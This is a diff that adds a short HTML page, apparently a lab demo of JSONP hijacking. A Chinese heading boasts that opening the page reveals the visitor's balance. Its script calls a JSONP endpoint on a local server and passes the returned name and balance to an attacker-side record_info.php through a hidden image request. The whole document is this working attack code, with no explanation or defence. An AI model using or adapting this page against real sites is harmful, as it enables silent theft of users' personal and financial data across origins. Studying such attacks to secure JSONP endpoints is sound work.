@@ -1,0 +1,23 @@
+<html>
+  <head>
+    <meta charset="utf-8">
+    <title>hacked!</title>
+    <style>
+      /* 隐藏 img 标签 */
+      img {
+        display: none;
+      }
+    </style>
+  </head>
+  <body>
+      <h4>当你打开这个网站的时候，我就知道你的余额了</h4>
+  </body>
+  <script>
+    function getInfo(data) {
+      const img = document.createElement('img');
+      img.src = `./record_info.php?name=${data.name}&balance=${data.balance}`
+      document.body.appendChild(img);
+    }
+  </script>
+  <script src="http://127.0.0.1:8089/json.php?callback=getInfo"></script>
+</html>
